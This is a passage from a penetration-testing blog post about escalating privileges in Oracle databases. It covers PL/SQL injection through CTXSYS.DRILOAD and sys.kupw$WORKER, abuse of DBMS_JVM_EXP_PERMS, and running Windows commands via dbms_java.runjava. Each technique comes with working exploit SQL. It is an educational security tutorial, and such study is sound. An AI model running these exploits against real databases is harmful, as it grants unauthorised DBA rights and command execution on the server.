</pre></table></code></div></div><h2 id="elevating-privileges"><span class="mr-2">Elevating Privileges</span><a href="#elevating-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You can use various methods to elevate privileges, ranging from classic buffer overflows and DLL patching to specialized attacks against databases, such as PL/SQL injections. The topic is very extensive and, in this article, I will not dwell on it, as this is discussed in large research papers, such as those found in the blogs of <a href="http://goo.gl/IebQN4">Lichfield</a> and <a href="http://goo.gl/vXhttf">Finnigan</a>. I will just demonstrate some of them, so that you have a general idea. During the testing, I recommend simply paying attention to current privileges and, based on this, search for desired loopholes in the Internet. Unlike MS SQL, where an attacker can inject <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> almost immediately after <code class="language-plaintext highlighter-rouge">SELECT</code> by simply closing it with a quotation mark, Oracle DB flatly rejects such tricks. For this reason, we cannot every time resort to classical SQL injections although, in this case, too, it is possible to find a way out. We will consider PL/SQL injections, which are modifying the process of executing a procedure (function, trigger, and other objects) by embedding random commands into available input parameters. (с) Sh2kerr In order to embed the payload, find a function where the input parameters are not filtered. Remember that Oracle SQL does not allow multi-statement (multiple) queries, therefore, most likely, you will need to use some “special” procedures that have this feature. The main idea behind the attack is as follows: By default, unless specified otherwise, the procedure is executed on behalf of the owner and not on behalf of the user who started it. In other words, if a procedure owned by <code class="language-plaintext highlighter-rouge">SYS</code> account is available for execution and you can embed your code into it, your payload will also be executed in the context of <code class="language-plaintext highlighter-rouge">SYS</code> account. As I already mentioned, this is not what happens always, as there are procedures with ‘authid current_user’ parameter, which means that this procedure will be executed with privileges of the current user. However, usually in each version, you can find some functions that are vulnerable to PL/ SQL injection. A general view of this process is shown right there:</p><p><img data-src="/assets/img/pitcures/oracle/oracle.png" alt="Untitled" data-proofer-ignore></p><p>In short, instead of expected legitimate argument, we pass some malicious code that becomes a part of procedure. A good example is provided by <code class="language-plaintext highlighter-rouge">CTXSYS.DRILOAD</code> function. It is executed on behalf of <code class="language-plaintext highlighter-rouge">CTXSYS</code> and does not filter the input parameter, which allows you to easily rise up to <code class="language-plaintext highlighter-rouge">DBA</code>:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">exec</span> <span class="n">ctxsys</span><span class="p">.</span><span class="n">driload</span><span class="p">.</span><span class="n">validate_stmt</span><span class="p">(</span><span class="s1">'grant dba to scott'</span><span class="p">);</span>
</pre></table></code></div></div><p>However, by now, this is probably history, since the vulnerability was found in 2004, and it affects only the old versions 8–9. Usually, the process of escalating the privileges is divided into two parts: writing the procedure that increases the rights and performing the injection itself. A typical procedure is as follows:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="k">CREATE</span> <span class="k">OR</span> <span class="k">REPLACE</span> <span class="k">FUNCTION</span> <span class="n">F1</span>
<span class="k">RETURN</span> <span class="n">NUMBER</span> <span class="n">AUTHID</span> <span class="k">CURRENT_USER</span>
<span class="k">IS</span>
<span class="n">PRAGMA</span> <span class="n">AUTONOMOUS_TRANSACTION</span><span class="p">;</span>
<span class="k">BEGIN</span>
<span class="k">EXECUTE</span> <span class="k">IMMEDIATE</span> <span class="s1">'GRANT DBA TO TEST'</span><span class="p">;</span>
<span class="k">COMMIT</span><span class="p">;</span><span class="k">RETURN</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="k">END</span><span class="p">;</span>
<span class="o">/</span>
</pre></table></code></div></div><p>Now we can inject a procedure as an argument of vulnerable function (example for versions 10x):</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">exec</span> <span class="n">sys</span><span class="p">.</span><span class="n">kupw</span><span class="err">$</span><span class="n">WORKER</span><span class="p">.</span><span class="n">main</span><span class="p">(</span><span class="s1">'x'</span><span class="p">,</span><span class="s1">'YY</span><span class="se">''</span><span class="s1"> and 1=test1.f1 –-'</span><span class="p">);</span>
</pre></table></code></div></div><p>In the not too recent versions 10 and 11, there is one <code class="language-plaintext highlighter-rouge">nice</code> exception, or rather a vulnerability, that allows you to execute commands on the server without having <code class="language-plaintext highlighter-rouge">DBA</code> rights: <code class="language-plaintext highlighter-rouge">DBMS_JVM_EXP_PERMS</code> procedure allows a user with <code class="language-plaintext highlighter-rouge">CREATE SESSION</code> privilege to get <code class="language-plaintext highlighter-rouge">JAVA IO</code> rights. The attack can be mounted as follows:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">SQL</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">DECLARE</span>
   <span class="n">POL</span> <span class="n">DBMS_JVM_EXP_PERMS</span><span class="p">.</span><span class="n">TEMP_JAVA_POLICY</span><span class="p">;</span>
   <span class="k">CURSOR</span> <span class="n">C1</span> <span class="k">IS</span> <span class="k">SELECT</span>
<span class="s1">'GRANT'</span><span class="p">,</span><span class="s1">'GREMLIN'</span><span class="p">,</span><span class="s1">'SYS'</span><span class="p">,</span><span class="s1">'java.io.FilePermission'</span><span class="p">,</span><span class="s1">'&amp;lt;FILES&amp;gt;&amp;gt;'</span><span class="p">,</span><span class="s1">'execute'</span><span class="p">,</span><span class="s1">'ENABLED'</span> <span class="k">FROM</span> <span class="n">DUAL</span><span class="p">;</span>
  <span class="k">BEGIN</span>
  <span class="k">OPEN</span> <span class="n">C1</span><span class="p">;</span>
  <span class="k">FETCH</span> <span class="n">C1</span> <span class="n">BULK</span> <span class="n">COLLECT</span> <span class="k">INTO</span> <span class="n">POL</span><span class="p">;</span>
  <span class="k">CLOSE</span> <span class="n">C1</span><span class="p">;</span>
  <span class="n">DBMS_JVM_EXP_PERMS</span><span class="p">.</span><span class="n">IMPORT_JVM_PERMS</span><span class="p">(</span><span class="n">POL</span><span class="p">);</span>
  <span class="k">END</span><span class="p">;</span>
  <span class="o">/</span>
 
<span class="n">PL</span><span class="o">/</span><span class="k">SQL</span> <span class="k">procedure</span> <span class="n">successfully</span> <span class="n">completed</span><span class="p">.</span>
</pre></table></code></div></div><p>Now that you have the privileges to call up Java procedures, you can evoke a response from the Windows interpreter and execute something:</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span data-label-text="Sql"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SQL</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">select</span> <span class="n">dbms_java</span><span class="p">.</span><span class="n">runjava</span><span class="p">(</span><span class="err">‘</span><span class="n">oracle</span><span class="o">/</span><span class="n">aurora</span><span class="o">/</span><span class="n">util</span><span class="o">/</span><span class="n">Wrapper</span> <span class="k">c</span><span class="p">:</span><span class="err">\\</span><span class="n">windows</span><span class="err">\\</span><span class="n">system32</span><span class="err">\\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="k">c</span> <span class="n">echo</span> <span class="mi">123</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="k">c</span><span class="p">:</span><span class="err">\\</span><span class="n">hack</span><span class="err">’</span><span class="p">)</span><span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pentesting-protocols/'>pentesting protocols</a>, <a href='/categories/oracle/'>oracle</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >pentesting</a> <a href="/tags/oracle/" class="post-tag no-text-decoration" >oracle</a> <a href="/tags/best-practicies/" class="post-tag no-text-decoration" >best practicies</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=ORACLE+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&url=https%3A%2F%2Fsecybr.com%2Fposts%2Foracle-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=ORACLE+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks.&u=https%3A%2F%2Fsecybr.com%2Fposts%2Foracle-pentesting-best-practices%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fsecybr.com%2Fposts%2Foracle-pentesting-best-practices%2F&text=ORACLE+Pentesting+Best+Practices+-+secybr+%7C+penetration+testing%2C+red+teaming+and+hack+tricks." data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/subdomain-enumeration-methods/">Subdomain Enumeration Methods</a><li><a href="/posts/shodan-tutorials-for-best-practicies/">Shodan.io Tutorials for Best Practices</a><li><a href="/posts/collecting-target-email-address/">Collecting Target Email Addresses</a><li><a href="/posts/evasion-tactics-for-scanning-targets/">Evasion Tactics For Scanning Targets (Active Scan)</a><li><a href="/posts/dumping-lsass-without-mimikatz/">Dumping LSASS Without Mimikatz</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/ftp-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>FTP Pentesting Best Practices</h3><div class="text-muted small"><p> FTP FTP usually uses port 21 What is FTP? FTP (File Transfer Protocol) is used to communicate and transfer files between computers on a TCP/IP (Transmission Control Protocol/Internet Protoco...</p></div></div></a></div><div class="card"> <a href="/posts/telnet-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654290000" data-df="ll" > Jun 4, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Telnet Pentesting Best Practices</h3><div class="text-muted small"><p> Telnet Telnet usually uses port 23,992 What is Telnet? Telnet is a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication c...</p></div></div></a></div><div class="card"> <a href="/posts/finger-pentesting-best-practices/"><div class="card-body"> <em class="small" data-ts="1654376400" data-df="ll" > Jun 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Finger Pentesting Best Practices</h3><div class="text-muted small"><p> Finger Finger usually uses port 79 What is Finger? Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly othe...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/pop3-pentesting-best-practices/" class="btn btn-outline-primary" prompt="Older"><p>POP3 Pentesting Best Practices</p></a> <a href="/posts/nfs-pentesting-best-practicies/" class="btn btn-outline-primary" prompt="Newer"><p>NFS Pentesting Best Practices</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://secybr.com/posts/oracle-pentesting-best-practices/'; this.page.identifier = '/posts/oracle-pentesting-best-practices/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://secybr-com.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><div class="row justify-content-center border-top"> <small class="my-4">Powered by <a href="https://twitter.com/0xhav0c" target="_blank" rel="noopener noreferrer">0xhav0c</a> © 2022 - <a href="/privacy-policy/">Privacy Policy</a> </small></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/best-practicies/">best practicies</a> <a class="post-tag" href="/tags/red-team/">red-team</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/active-scan-evasion-tactics/">active scan evasion tactics</a> <a class="post-tag" href="/tags/asset-discovery-methods/">asset discovery methods</a> <a class="post-tag" href="/tags/asset-discovery/">asset discovery</a> <a class="post-tag" href="/tags/asset-enumeration-methods/">asset enumeration methods</a> <a class="post-tag" href="/tags/assets-of-target/">assets of target</a> <a class="post-tag" href="/tags/attack-detection-mechanism/">attack detection mechanism</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-XBEEHR73W1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-XBEEHR73W1'); }); </script>
